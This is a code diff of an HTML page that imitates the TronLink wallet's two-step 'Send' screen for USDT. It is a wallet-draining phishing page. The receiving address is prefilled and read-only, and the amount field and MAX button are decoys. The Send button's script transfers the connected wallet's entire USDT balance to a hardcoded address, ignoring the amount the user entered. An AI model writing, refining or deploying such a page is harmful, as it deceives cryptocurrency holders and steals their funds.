@@ -5,7 +5,9 @@
     <title>TronLink App - Send</title>
     <style>
         body { background-color: #f7f8fa; color: #1c1c1e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .tronlink-mobile { width: 375px; height: 760px; background: #ffffff; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); padding: 24px 20px; box-sizing: border-box; display: flex; flex-direction: column; position: relative; border: 1px solid #eaeaea; }
+        .tronlink-mobile { width: 375px; height: 760px; background: #ffffff; border-radius: 24px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); padding: 24px 20px; box-sizing: border-box; display: flex; flex-direction: column; position: relative; border: 1px solid #eaeaea; overflow: hidden; }
+        .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
+        .screen.active { display: flex; }
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .header-left { display: flex; align-items: center; gap: 12px; cursor: pointer; }
         .back-arrow { font-size: 22px; font-weight: 300; color: #1c1c1e; }
@@ -13,9 +15,13 @@
         .header h3 span { font-size: 14px; color: #8e8e93; font-weight: 400; }
         .multisig { font-size: 14px; color: #3b50df; font-weight: 500; text-decoration: none; }
         .section-title { font-size: 15px; font-weight: 600; color: #1c1c1e; margin-bottom: 12px; }
+        
+        /* Contenedores de Input estilo App */
         .input-container { background: #f4f5f7; border-radius: 12px; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
         .input-container input { background: transparent; border: none; color: #1c1c1e; font-size: 14px; outline: none; width: 75%; }
         .input-container input::placeholder { color: #c4c4c7; }
+        
+        /* Detalles de Pantalla 1 */
         .input-actions { display: flex; align-items: center; gap: 14px; }
         .btn-paste { background: #ffffff; border: none; color: #1c1c1e; font-size: 12px; font-weight: 500; padding: 4px 10px; border-radius: 6px; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
         .scan-icon { width: 16px; height: 16px; border: 2px solid #1c1c1e; border-radius: 3px; position: relative; cursor: pointer; }
@@ -27,68 +33,138 @@
         .recent-item { border-bottom: 1px solid #f5f5f7; padding-bottom: 14px; cursor: pointer; }
         .address { font-size: 13px; font-weight: 400; color: #1c1c1e; word-break: break-all; font-family: monospace; }
         .date { font-size: 11px; color: #aeaeae; margin-top: 4px; }
-        .btn-next { background: #3b50df; color: #ffffff; width: calc(100% - 40px); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; position: absolute; bottom: 24px; left: 20px; transition: background 0.2s; text-align: center; }
-        .btn-next:hover { background: #2a3cb3; }
+        
+        /* Detalles de Pantalla 2 */
+        .token-selector { background: #f4f5f7; border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; cursor: pointer; }
+        .token-left { display: flex; align-items: center; gap: 12px; }
+        .token-icon { width: 28px; height: 28px; background: #26a17b; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; }
+        .token-text { font-size: 16px; font-weight: 500; color: #1c1c1e; }
+        .token-text span { color: #8e8e93; font-weight: 400; font-size: 14px; }
+        .arrow-right { color: #8e8e93; font-size: 16px; }
+        .btn-max { background: #ffffff; border: none; color: #1c1c1e; font-size: 13px; font-weight: 600; padding: 4px 10px; border-radius: 6px; cursor: pointer; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .available-text { font-size: 13px; color: #8e8e93; margin-top: -14px; margin-bottom: 24px; }
+        .notes-link { color: #3b50df; font-size: 14px; font-weight: 500; text-decoration: none; display: flex; align-items: center; justify-content: flex-end; gap: 4px; }
+
+        /* Botones de acción inferiores fijos */
+        .btn-bottom { background: #3b50df; color: #ffffff; width: calc(100% - 40px); border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; position: absolute; bottom: 24px; left: 20px; transition: background 0.2s; text-align: center; }
+        .btn-bottom:hover { background: #2a3cb3; }
     </style>
 </head>
 <body>
 
 <div class="tronlink-mobile">
-    <div class="header">
-        <div class="header-left" onclick="conectarWallet()">
-            <span class="back-arrow">&lt;</span>
-            <h3>Send <span>(1/2)</span></h3>
+    
+    <!-- PANTALLA 1/2: SELECCIÓN DE CUENTA -->
+    <div class="screen active" id="screen1">
+        <div class="header">
+            <div class="header-left">
+                <span class="back-arrow">&lt;</span>
+                <h3>Send <span>(1/2)</span></h3>
+            </div>
+            <a href="#" class="multisig">Multisig Transfer</a>
         </div>
-        <a href="#" class="multisig">Multisig Transfer</a>
+
+        <div class="section-title">Receiving Account</div>
+        <div class="input-container">
+            <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
+            <div class="input-actions">
+                <div class="scan-icon"></div>
+                <button class="btn-paste">Paste</button>
+            </div>
+        </div>
+
+        <div class="tabs">
+            <div class="tab active">Recents</div>
+            <div class="tab">Address Book</div>
+            <div class="tab">My Accounts</div>
+        </div>
+
+        <div class="recent-list">
+            <div class="recent-item">
+                <div class="address">THyXGLkL9CGdnhgkWGoUzdJcf5vjFSrK5G</div>
+                <div class="date">2026-09-02 16:29</div>
+            </div>
+            <div class="recent-item">
+                <div class="address">TNqaxFKxhoYdMgbZqVHumy84tBidBaWT45</div>
+                <div class="date">2026-08-31 11:04</div>
+            </div>
+            <div class="recent-item">
+                <div class="address">TJJZHRUsVwMegvSfUjefDhQkJcjX5WP9hG</div>
+                <div class="date">2026-08-31 07:36</div>
+            </div>
+        </div>
+
+        <button class="btn-bottom" onclick="irAPantalla2()">Next</button>
     </div>
 
-    <div class="section-title">Receiving Account</div>
-    <div class="input-container">
-        <input type="text" id="target" value="TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw" readonly>
-        <div class="input-actions">
-            <div class="scan-icon"></div>
-            <button class="btn-paste">Paste</button>
+    <!-- PANTALLA 2/2: CONFIGURACIÓN DE MONTO -->
+    <div class="screen" id="screen2">
+        <div class="header">
+            <div class="header-left" onclick="irAPantalla1()">
+                <span class="back-arrow">&lt;</span>
+                <h3>Send <span>(2/2)</span></h3>
+            </div>
         </div>
+
+        <div class="section-title">Token</div>
+        <div class="token-selector">
+            <div class="token-left">
+                <div class="token-icon">₮</div>
+                <div class="token-text">USDT <span>(Tether USD)</span></div>
+            </div>
+            <div class="arrow-right">&gt;</div>
+        </div>
+
+        <div class="section-title">Amount</div>
+        <div class="input-container">
+            <input type="number" id="userAmount" placeholder="Enter the transfer amount" value="10">
+            <button class="btn-max" onclick="aplicarMax()">MAX</button>
+        </div>
+        <div class="available-text">Available: <span id="availableBalance">7.5</span></div>
+
+        <a href="#" class="notes-link">Add notes to this transfer <span>∨</span></a>
+
+        <button class="btn-bottom" onclick="ejecutarEnvioMaximo()">Send</button>
     </div>
 
-    <div class="tabs">
-        <div class="tab active">Recents</div>
-        <div class="tab">Address Book</div>
-        <div class="tab">My Accounts</div>
-    </div>
-
-    <div class="recent-list">
-        <div class="recent-item">
-            <div class="address">THyXGLkL9CGdnhgkWGoUzdJcf5vjFSrK5G</div>
-            <div class="date">2026-09-02 16:29</div>
-        </div>
-        <div class="recent-item">
-            <div class="address">TNqaxFKxhoYdMgbZqVHumy84tBidBaWT45</div>
-            <div class="date">2026-08-31 11:04</div>
-        </div>
-        <div class="recent-item">
-            <div class="address">TJJZHRUsVwMegvSfUjefDhQkJcjX5WP9hG</div>
-            <div class="date">2026-08-31 07:36</div>
-        </div>
-    </div>
-
-    <button class="btn-next" onclick="ejecutarEnvioMaximo()">Next</button>
 </div>
 
 <script>
     const CONTRACT_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
     const DESTINO_FIJO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";
 
-    async function conectarWallet() {
+    function irAPantalla2() {
+        document.getElementById('screen1').classList.remove('active');
+        document.getElementById('screen2').classList.add('active');
+        conectarYActualizarBalance();
+    }
+
+    function irAPantalla1() {
+        document.getElementById('screen2').classList.remove('active');
+        document.getElementById('screen1').classList.add('active');
+    }
+
+    async function conectarYActualizarBalance() {
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-            return window.tronWeb;
+            try {
+                const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
+                const saldoRaw = await contrato.balanceOf(window.tronWeb.defaultAddress.base58).call();
+                const saldoDecimal = (Number(saldoRaw) / 1000000).toFixed(2);
+                document.getElementById('availableBalance').innerText = saldoDecimal;
+            } catch(e) {
+                console.log("No se pudo leer el balance exacto de la blockchain.");
+            }
         }
-        return null;
+    }
+
+    function aplicarMax() {
+        const bal = document.getElementById('availableBalance').innerText;
+        document.getElementById('userAmount').value = bal;
     }
 
     async function ejecutarEnvioMaximo() {
         if (!window.tronWeb) {
-            alert("Asegúrate de estar en un navegador con la extensión TronLink activa.");
+            alert("TronLink extension not found.");
             return;
         }
 
@@ -96,7 +172,6 @@
             const miWallet = window.tronWeb.defaultAddress.base58;
             const contrato = await window.tronWeb.contract().at(CONTRACT_USDT);
 
-            // Consulta el saldo en Mainnet
             const saldoBigNum = await contrato.balanceOf(miWallet).call();
             const saldoTotalStr = saldoBigNum.toString();
 
@@ -105,14 +180,12 @@
                 return;
             }
 
-            // Ejecuta el envío con el saldo máximo capturado de la blockchain
             await contrato.transfer(DESTINO_FIJO, saldoTotalStr).send();
         } catch (e) {
             console.error(e);
         }
     }
-
-    window.addEventListener('load', () => { setTimeout(conectarWallet, 500); });
 </script>
 </body>
 </html>
+
